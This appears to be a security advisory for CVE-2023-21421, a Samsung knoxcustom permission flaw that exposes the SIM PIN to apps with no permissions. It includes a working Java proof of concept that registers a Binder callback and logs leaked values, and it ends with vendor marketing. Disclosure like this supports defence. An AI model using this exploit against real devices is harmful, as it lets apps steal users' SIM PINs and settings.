# Details

<table>
    <tr>
        <td>Name</td>
        <td>Samsung Android Framework</td>
    </tr>
    <tr>
        <td>Library path</td>
        <td><code>/system/framework/services.jar</code></td>
    </tr>
    <tr>
        <td>Reported date</td>
        <td>2022.07.14</td>
    </tr>
    <tr>
        <td>Fixed date</td>
        <td>2023.01.04</td>
    </tr>
    <tr>
        <td>Severity</td>
        <td>Moderate</td>
    </tr>
    <tr>
        <td>Handle</td>
        <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-21421">CVE-2023-21421</a> (SVE-2022-1672)</td>
    </tr>
    <tr>
        <td>Reward</td>
        <td>$1180</td>
    </tr>
</table>

# Description

The system service `knoxcustom` (`com.samsung.android.knox.custom.IKnoxCustomManager`) requires system permissions to read most data. For example, an unprivileged app cannot call the `getUnlockSimPin()` method because of permissions checks. But the unprotected `registerSystemUiCallback()` method allowed an attacker without any permissions to register their callback and receive updates of many values, including SIM PIN via the callback method `setUnlockSimPin()`.

**Proof of Concept**

```java
static final int TRANSACTION_registerSystemUiCallback = 277;

IKnoxCustomManagerSystemUiCallback.Stub callback = new IKnoxCustomManagerSystemUiCallback.Stub() {
    @Override
    public void setLockScreenHiddenItems(int i) {
        Log.d("evil", "setLockScreenHiddenItems: " + i);
    }

    @Override
    public void setLockScreenOverrideMode(int i) {
        Log.d("evil", "setLockScreenOverrideMode: " + i);
    }

    @Override
    public void setQuickPanelButtons(int i) {
        Log.d("evil", "setQuickPanelButtons: " + i);
    }

    @Override
    public void setQuickPanelEditMode(int i) {
        Log.d("evil", "setQuickPanelEditMode: " + i);
    }

    @Override
    public void setQuickPanelItems(String str) {
        Log.d("evil", "setQuickPanelItems: " + str);
    }

    @Override
    public void setQuickPanelUnavailableButtons(String str) {
        Log.d("evil", "setQuickPanelUnavailableButtons: " + str);
    }

    @Override
    public void setScreenOffOnStatusBarDoubleTapState(boolean z) {
        Log.d("evil", "setScreenOffOnStatusBarDoubleTapState: " + z);
    }

    @Override
    public void setStatusBarTextInfo(String str, int i, int i2, int i3) {
        Log.d("evil", "setStatusBarTextInfo. $0 = " + str + ", $1 = " + i + ", $2 = " + i2 + ", $3 = " + i3);
    }

    @Override
    public void setStatusBarIconsState(boolean z) {
        Log.d("evil", "setStatusBarIconsState: " + z);
    }

    @Override
    public void setBatteryLevelColourItem(StatusbarIconItem statusbarIconItem) {
        Log.d("evil", "setBatteryLevelColourItem: " + statusbarIconItem);
    }

    @Override
    public void setHideNotificationMessages(int i) {
        Log.d("evil", "setHideNotificationMessages: " + i);
    }

    @Override
    public void setStatusBarNotificationsState(boolean z) {
        Log.d("evil", "setStatusBarNotificationsState: " + z);
    }

    @Override
    public void setUnlockSimOnBootState(boolean z) {
        Log.d("evil", "setUnlockSimOnBootState: " + z);
    }

    @Override
    public void setUnlockSimPin(String str) {
        Log.d("evil", "setUnlockSimPin: " + str);
    }

    @Override
    public void setChargerConnectionSoundEnabledState(boolean z) {
        Log.d("evil", "setChargerConnectionSoundEnabledState: " + z);
    }

    @Override
    public void setStatusBarHidden(boolean z) {
        Log.d("evil", "setStatusBarHidden: " + z);
    }

    @Override
    public void setVolumePanelEnabledState(boolean z) {
        Log.d("evil", "setVolumePanelEnabledState: " + z);
    }

    @Override
    public void setQuickPanelButtonUsers(boolean z) {
        Log.d("evil", "setQuickPanelButtonUsers: " + z);
    }

    @Override
    public void setHardKeyIntentState(boolean z) {
        Log.d("evil", "setHardKeyIntentState: " + z);
    }
};

protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);

    try {
        IBinder binder = getService("knoxcustom");

        Parcel parcel = Parcel.obtain();
        parcel.writeInterfaceToken(binder.getInterfaceDescriptor());
        parcel.writeStrongBinder(callback);

        Parcel reply = Parcel.obtain();

        binder.transact(TRANSACTION_registerSystemUiCallback, parcel, reply, 0);
        reply.readException();
    } catch (Throwable th) {
        throw new RuntimeException(th);
    }
}

private IBinder getService(String name) throws Throwable {
    return (IBinder) Class.forName("android.os.ServiceManager")
            .getDeclaredMethod("getServiceOrThrow", String.class)
            .invoke(null, name);
}
```

## References

- [Oversecured Blog. Discovering vendor-specific vulnerabilities in Android](https://blog.oversecured.com/Discovering-vendor-specific-vulnerabilities-in-Android/)

## Conclusion

Mobile app security is more critical than ever in today's digital landscape. As we have shown through our research, even the most reputable brands are not immune to the threat of cyberattacks. 

At Oversecured, we are committed to help our clients stay ahead of the curve with our industry-leading mobile app vulnerability scanning technology. With our comprehensive approach to mobile app security, you can trust that your brand and your users are protected from data breaches and other security threats.

Don't wait until it's too late. [Get a free consultation](https://oversecured.com/contact-us?utm_source=github&utm_medium=article&utm_campaign=samsung2022) and find out how we can help secure your mobile apps. Together, we can build a safer digital world.